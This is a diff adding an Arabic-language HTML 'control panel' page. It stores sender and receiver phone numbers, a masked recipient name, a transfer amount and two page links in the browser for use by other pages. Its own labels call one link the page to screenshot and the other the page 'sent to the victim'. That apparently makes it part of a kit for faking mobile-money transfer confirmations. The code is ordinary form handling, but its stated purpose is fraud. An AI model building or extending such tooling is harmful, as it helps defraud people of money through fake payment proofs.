@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>لوحة التحكم - يدوي</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Tahoma', Arial, sans-serif;
+        }
+        body {
+            background: #f4f6f9;
+            color: #1a1a2e;
+            padding: 30px 20px;
+            direction: rtl;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: #ffffff;
+            border-radius: 20px;
+            padding: 30px 25px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.06);
+            border: 1px solid #e9ecef;
+        }
+        h1 {
+            text-align: center;
+            font-size: 24px;
+            color: #e60000;
+            margin-bottom: 8px;
+        }
+        .subtitle {
+            text-align: center;
+            color: #6b6b6b;
+            font-size: 14px;
+            margin-bottom: 24px;
+        }
+        .field {
+            margin-bottom: 16px;
+        }
+        .field label {
+            display: block;
+            font-weight: 600;
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 4px;
+        }
+        .field input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 2px solid #e9ecef;
+            border-radius: 12px;
+            font-size: 15px;
+            background: #f8f9fc;
+            transition: 0.2s;
+        }
+        .field input:focus {
+            border-color: #e60000;
+            outline: none;
+            background: #ffffff;
+        }
+        .btn {
+            padding: 12px 20px;
+            border: none;
+            border-radius: 30px;
+            font-weight: 700;
+            font-size: 15px;
+            cursor: pointer;
+            transition: 0.2s;
+            width: 100%;
+        }
+        .btn-primary {
+            background: #e60000;
+            color: white;
+        }
+        .btn-primary:hover {
+            background: #cc0000;
+        }
+        .btn-success {
+            background: #28a745;
+            color: white;
+        }
+        .btn-success:hover {
+            background: #218838;
+        }
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #28a745;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 30px;
+            font-weight: bold;
+            opacity: 0;
+            transition: 0.4s;
+            pointer-events: none;
+            z-index: 999;
+        }
+        .toast.show {
+            opacity: 1;
+        }
+        .row {
+            display: flex;
+            gap: 16px;
+        }
+        .row .field {
+            flex: 1;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            border-top: 1px solid #eee;
+            padding-top: 16px;
+            color: #6b6b6b;
+            font-size: 14px;
+        }
+        @media (max-width: 500px) {
+            .row { flex-direction: column; gap: 0; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>لوحة التحكم - يدوي</h1>
+    <p class="subtitle">أدخل البيانات والروابط بنفسك</p>
+
+    <!-- بيانات التحويل -->
+    <div class="row">
+        <div class="field">
+            <label>رقم المرسل (من)</label>
+            <input type="text" id="senderPhone" placeholder="مثال: 01012345678">
+        </div>
+        <div class="field">
+            <label>رقم المستلم (إلى)</label>
+            <input type="text" id="receiverPhone" placeholder="مثال: 01008652784">
+        </div>
+    </div>
+
+    <div class="field">
+        <label>اسم المستلم</label>
+        <input type="text" id="receiverName" placeholder="مثال: خالد ع** م*** ا*****">
+    </div>
+
+    <div class="field">
+        <label>المبلغ (جنيه)</label>
+        <input type="text" id="amount" placeholder="مثال: 600">
+    </div>
+
+    <hr style="margin: 20px 0; border: 1px dashed #ddd;">
+
+    <!-- الروابط -->
+    <div class="field">
+        <label>رابط صفحة السيندر (اللي هتاخد منها سكرين)</label>
+        <input type="text" id="senderLink" placeholder="https://your-domain.com/sender.html">
+    </div>
+
+    <div class="field">
+        <label>رابط صفحة الريسيفر (اللي هتبعت للضحية)</label>
+        <input type="text" id="receiverLink" placeholder="https://your-domain.com/receiver.html">
+    </div>
+
+    <!-- أزرار -->
+    <button class="btn btn-primary" onclick="saveData()">حفظ البيانات</button>
+    <button class="btn btn-success" onclick="loadData()" style="margin-top:10px;">تحميل البيانات المحفوظة</button>
+
+    <div class="footer">
+        <span>البيانات هتتحفظ في المتصفح وتظهر في باقي الصفحات</span>
+    </div>
+</div>
+
+<!-- Toast -->
+<div class="toast" id="toast">تم الحفظ</div>
+
+<script>
+    // ====== حفظ البيانات في localStorage ======
+    function saveData() {
+        const data = {
+            senderPhone: document.getElementById('senderPhone').value,
+            receiverPhone: document.getElementById('receiverPhone').value,
+            receiverName: document.getElementById('receiverName').value,
+            amount: document.getElementById('amount').value,
+            senderLink: document.getElementById('senderLink').value,
+            receiverLink: document.getElementById('receiverLink').value
+        };
+
+        localStorage.setItem('dashboardData', JSON.stringify(data));
+        showToast('تم حفظ البيانات');
+    }
+
+    // ====== تحميل البيانات من localStorage ======
+    function loadData() {
+        const stored = localStorage.getItem('dashboardData');
+        if (!stored) {
+            showToast('لا توجد بيانات محفوظة');
+            return;
+        }
+
+        const data = JSON.parse(stored);
+        document.getElementById('senderPhone').value = data.senderPhone || '';
+        document.getElementById('receiverPhone').value = data.receiverPhone || '';
+        document.getElementById('receiverName').value = data.receiverName || '';
+        document.getElementById('amount').value = data.amount || '';
+        document.getElementById('senderLink').value = data.senderLink || '';
+        document.getElementById('receiverLink').value = data.receiverLink || '';
+
+        showToast('تم تحميل البيانات');
+    }
+
+    // ====== Toast ======
+    function showToast(msg) {
+        const toast = document.getElementById('toast');
+        toast.textContent = msg;
+        toast.classList.add('show');
+        setTimeout(() => toast.classList.remove('show'), 2500);
+    }
+
+    // تحميل البيانات تلقائياً عند فتح الصفحة
+    window.onload = loadData;
+</script>
+
+</body>
+</html>
